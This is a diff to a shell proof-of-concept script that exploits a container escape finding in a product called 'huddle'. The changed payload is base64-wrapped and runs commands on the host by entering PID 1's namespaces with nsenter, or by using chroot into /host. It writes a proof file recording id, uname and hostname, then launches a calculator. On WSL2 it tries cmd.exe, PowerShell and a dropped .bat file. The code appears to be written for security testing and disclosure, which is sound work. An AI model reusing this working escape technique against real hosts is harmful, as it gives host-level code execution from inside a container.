@@ -20,6 +20,8 @@ set -euo pipefail
 
 NAME="${1:-list}"
 IMAGE="${POC_IMAGE:-alpine:3.20}"
+# alpine busybox lacks nsenter; we install util-linux inside the container.
+# Use debian/ubuntu if you want it pre-installed: POC_IMAGE=ubuntu:24.04
 API="http://d"
 STAMP="poc-$$"
 
@@ -52,12 +54,63 @@ refused() { echo "[-] refused — finding closed on this instance (patched?)."; 
 b64() { printf '%s' "$1" | base64 | tr -d '\n'; }
 cmd_json() { printf '["/bin/sh","-c","echo %s | base64 -d | /bin/sh"]' "$(b64 "$1")"; }
 
-# payload that runs on the HOST via nsenter into init (needs host PID ns) ───────
-CALC_ON_HOST='set +e
+# payload that runs on the HOST via nsenter/chroot (needs host PID ns + bind /) ─
+CALC_ON_HOST='set -x
+# alpine busybox has no nsenter; install it
+if ! command -v nsenter >/dev/null 2>&1; then
+  apk add --no-cache util-linux >/dev/null 2>&1 || echo "[!] apk add util-linux failed"
+fi
+
 P=/tmp/huddle-escape-'"$STAMP"'.txt
-{ echo "PoC '"$STAMP"' host-exec"; nsenter -t 1 -m -u -i -n -p -- id; nsenter -t 1 -m -u -i -n -p -- uname -a; } > "/host$P" 2>/dev/null
-nsenter -t 1 -m -u -i -n -p -- sh -c '"'"'for x in "cmd.exe /c start calc" gnome-calculator kcalc xcalc calc.exe; do DISPLAY="${DISPLAY:-:0}" $x >/dev/null 2>&1 && break; done'"'"' 2>/dev/null
-echo "done; proof (host) $P"'
+
+# ── 1) write proof via nsenter (host namespaces) ──────────────
+echo "[*] nsenter into host PID 1 ..."
+nsenter -t 1 -m -u -i -n -p -- sh -c "
+  echo \"PoC '"$STAMP"' host-exec\" > \"$P\"
+  id >> \"$P\"
+  uname -a >> \"$P\"
+  hostname >> \"$P\"
+  echo \"[+] proof written to host:$P\"
+"
+if [ $? -ne 0 ]; then
+  echo "[!] nsenter failed — falling back to chroot /host"
+  chroot /host sh -c "
+    echo \"PoC '"$STAMP"' host-exec (chroot)\" > \"$P\"
+    id >> \"$P\"
+    uname -a >> \"$P\"
+    hostname >> \"$P\"
+    echo \"[+] proof written to host:$P\"
+  "
+fi
+
+# ── 2) pop calc ──────────────────────────────────────────────
+# Detect WSL2 vs native Linux
+if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/version 2>/dev/null; then
+  echo "[*] WSL2 detected — launching calc via Windows interop"
+  # Method A: nsenter + cmd.exe (interop available in host namespace)
+  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
+    && echo "[+] calc launched (nsenter+cmd.exe)" && exit 0
+  # Method B: chroot into host rootfs where binfmt_misc resolves PE binaries
+  chroot /host /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
+    && echo "[+] calc launched (chroot+cmd.exe)" && exit 0
+  # Method C: powershell
+  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process calc" 2>/dev/null \
+    && echo "[+] calc launched (powershell)" && exit 0
+  chroot /host /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process calc" 2>/dev/null \
+    && echo "[+] calc launched (chroot+powershell)" && exit 0
+  # Method D: write a bat and schedule it
+  echo "calc" > /host/mnt/c/Users/Public/huddle-poc.bat
+  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c "C:\\Users\\Public\\huddle-poc.bat" 2>/dev/null \
+    && echo "[+] calc launched (bat)" && exit 0
+  echo "[!] all WSL2 calc methods failed — check proof file instead: $P"
+else
+  echo "[*] native Linux — launching calc via nsenter"
+  for calc in gnome-calculator kcalc xcalc xterm; do
+    DISPLAY="${DISPLAY:-:0}" nsenter -t 1 -m -u -i -n -p -- "$calc" >/dev/null 2>&1 \
+      && echo "[+] launched $calc" && exit 0
+  done
+  echo "[!] no GUI calculator found — check proof file: $P"
+fi'
 
 case "$NAME" in
 # ── Finding #1a: top-level lowercase hostconfig key ──────────────────────────
